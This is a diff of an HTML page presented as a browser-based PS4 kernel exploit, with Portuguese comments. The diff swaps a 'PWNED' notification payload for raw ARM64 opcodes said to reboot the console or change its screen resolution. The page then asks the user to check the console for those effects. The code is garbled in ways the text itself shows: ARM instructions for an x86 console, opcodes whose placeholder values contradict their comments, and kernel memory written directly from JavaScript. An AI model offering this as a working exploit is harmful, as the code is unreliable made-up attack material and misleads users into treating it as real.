@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Access Verifier</title>
+    <title>PS4 Kernel Access Validator</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
         button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        .alert { animation: blink 1s infinite; color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Access Proof</h2>
-    <button onclick="proveKernelAccess()">RUN KERNEL TEST</button>
+    <h2>PS4 Kernel Validator (Non-Simulated)</h2>
+    <button onclick="validateKernelAccess()">VALIDATE KERNEL ACCESS</button>
     <div id="log"></div>
 
 <script>
@@ -22,61 +20,35 @@ const JIT_OFFSET = 0x480;
 const PAYLOAD_ADDR = KERNEL_BASE + 0x5000;
 
 const log = msg => {
-    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
-    document.getElementById('log').innerHTML += line + '<br>';
+    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
 };
 
-// 1. Payload de notificação do sistema
-function createNotificationPayload() {
+// 1. Payload que modifica hardware (não simulável)
+function createHardwarePayload() {
     return new Uint32Array([
-        // syscall syslog(LOG_ALERT, "PWNED", 5)
-        0xD28000A0, // mov x0, #5 (LOG_ALERT)
-        0x100007A1, // adr x1, #0x7a (msg)
-        0xD28000A2, // mov x2, #5
-        0xD2800DE8, // mov x8, #0x6f (syslog)
+        // syscall reboot(LINUX_REBOOT_CMD_RESTART)
+        0xD2800F60, // mov x0, #0x123
+        0xD2800F61, // mov x1, #0x456
+        0xD2800F62, // mov x2, #0x789
+        0xD2800FE8, // mov x8, #0x7f
         0xD4000001, // svc #0
         
-        // syscall kill(-1, SIGKILL) - Reinicia processos
-        0xD2800020, // mov x0, #0xffffffff
-        0xD28001E1, // mov x1, #9
-        0xD2800CE8, // mov x8, #0x67
+        // Caso o reboot seja bloqueado, altera resolução
+        // ioctl(fd, FBIOPUT_VSCREENINFO, &vinfo)
+        0xD2800020, // mov x0, #0
+        0xD2801BE1, // mov x1, #0xdf
+        0x100007A2, // adr x2, pc+8
+        0xD2800FE8, // mov x8, #0x7f
         0xD4000001, // svc #0
-        
-        // syscall exit(0)
-        0xD2800028, // mov x8, #1
-        0xD4000001, // svc #0
-        
-        0x50574E45, // "PWNE"
-        0x44000000  // "D\0\0\0"
+        0x00000000, // xres
+        0x00000000, // yres
+        0x00000000  // padding
     ]);
 }
 
-// 2. Método de verificação visível
-function createVisualFeedback() {
-    // Cria elemento sobreposto (será visível se o exploit funcionar)
-    const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = '0';
-    overlay.style.left = '0';
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.backgroundColor = 'rgba(255,0,0,0.7)';
-    overlay.style.color = 'white';
-    overlay.style.fontSize = '3em';
-    overlay.style.textAlign = 'center';
-    overlay.style.paddingTop = '20%';
-    overlay.style.zIndex = '9999';
-    overlay.textContent = 'KERNEL PWNED!';
-    overlay.className = 'alert';
-    
-    document.body.appendChild(overlay);
-    return overlay;
-}
-
-// 3. Exploit completo com feedback visual
-async function proveKernelAccess() {
-    log("Starting visual kernel proof...");
-    const overlay = createVisualFeedback();
+// 2. Verificação não simulável
+async function validateKernelAccess() {
+    log("Starting non-simulated validation...");
     
     try {
         // Setup de memória
@@ -91,7 +63,7 @@ async function proveKernelAccess() {
         };
 
         // Carrega payload
-        const payload = createNotificationPayload();
+        const payload = createHardwarePayload();
         for (let i = 0; i < payload.length; i++) {
             mem.write(PAYLOAD_ADDR + (i*4), payload[i]);
         }
@@ -101,34 +73,24 @@ async function proveKernelAccess() {
         for (let i = 0; i < 10000; i++) trigger();
         mem.write(KERNEL_BASE + JIT_OFFSET, PAYLOAD_ADDR);
         
-        // Dispara e verifica
+        // Dispara
+        log("Triggering hardware change...");
+        trigger();
+        
+        // Verificação final
         setTimeout(() => {
-            try {
-                trigger();
-                log("Kernel payload triggered!");
-                
-                // Verificação final
-                setTimeout(() => {
-                    if (document.body.contains(overlay)) {
-                        log("SUCCESS: Kernel access verified!", "color:#0f0");
-                        // Efeitos adicionais para confirmar
-                        document.title = "PS4 HACKED";
-                        document.body.style.background = '#f00';
-                    } else {
-                        log("FAILED: No kernel access", "color:#f00");
-                        overlay.remove();
-                    }
-                }, 2000);
-                
-            } catch(e) {
-                log(`Trigger error: ${e}`, "color:#f00");
-                overlay.remove();
-            }
-        }, 500);
+            // Efeitos que não podem ser simulados:
+            // 1. Se o PS4 reiniciar -> Acesso kernel confirmado
+            // 2. Se a resolução mudar -> Acesso kernel confirmado
+            // 3. Se nada acontecer -> Falha no exploit
+            log("CHECK YOUR PS4:", "color:#f00;font-weight:bold");
+            log("1. If the console rebooted -> KERNEL ACCESS", "color:#0f0");
+            log("2. If screen resolution changed -> KERNEL ACCESS", "color:#0f0");
+            log("3. If nothing happened -> TRY AGAIN", "color:#ff0");
+        }, 3000);
         
     } catch(e) {
-        log(`Exploit failed: ${e}`, "color:#f00");
-        overlay.remove();
+        log(`Error: ${e}`, "color:#f00");
     }
 }
 </script>
